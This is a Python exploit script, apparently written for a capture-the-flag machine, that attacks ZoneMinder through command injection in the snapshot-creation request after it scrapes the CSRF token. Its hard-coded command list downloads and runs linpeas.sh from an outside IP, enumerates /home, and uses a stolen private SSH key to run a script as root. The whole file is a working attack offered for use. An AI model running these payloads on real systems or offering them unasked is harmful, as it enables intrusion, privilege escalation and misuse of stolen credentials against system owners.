#!/usr/bin/env python3
#coding: utf-8

import re
import requests
from bs4 import BeautifulSoup
import argparse
import base64

cmds = [
    "wget -O /tmp/linpeas.sh http://15.17.1.191:1234/linpeas.sh",
    "chmod 777 /tmp/linpeas.sh",
    "/tmp/linpeas.sh -s -q -N 2> /dev/null",
    "id",
    "find /home -ls",
    "echo \"/script.sh\" | ssh -i /home/webdev/.ssh/id_rsa -o StrictHostKeyChecking=no root@localhost",
    "rm /tmp/linpeas.sh"   
]

class ZoneMinderExploit:
    def __init__(self, target_uri):
        self.target_uri = target_uri
        self.csrf_magic = None

    def fetch_csrf_token(self):
        print("[>] fetching csrt token")
        response = requests.get(self.target_uri)
        self.csrf_magic = self.get_csrf_magic(response)
        if response.status_code == 200 and re.match(r'^key:[a-f0-9]{40},\d+', self.csrf_magic):
            print(f"[>] recieved the token: {self.csrf_magic}")
            return True
        print("[!] unable to fetch or parse token.")
        return False

    def get_csrf_magic(self, response):
        return BeautifulSoup(response.text, 'html.parser').find('input', {'name': '__csrf_magic'}).get('value', None)

    def execute_command(self, cmd):
        print("[>] sending payload..")
        data = {'view': 'snapshot', 'action': 'create', 'monitor_ids[0][Id]': f';{cmd}', '__csrf_magic': self.csrf_magic}
        response = requests.post(f"{self.target_uri}/index.php", data=data)
        print("[>] payload sent" if response.status_code == 200 else "[!] failed to send payload")

    def exploit(self, payload):
        if self.fetch_csrf_token():
            print(f"[>] executing...")
            self.execute_command(payload)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target-url', required=True, help='target url endpoint')
    parser.add_argument('-ip', '--local-ip', required=False, help='local ip')
    parser.add_argument('-p', '--port', required=False, help='port')
    args = parser.parse_args()

    exploiter = ZoneMinderExploit(args.target_url)

    for cmd in cmds:
        print(f"[>] executing command: {cmd}")
        exploiter.exploit(cmd)
        print(f"[>] command executed: {cmd}")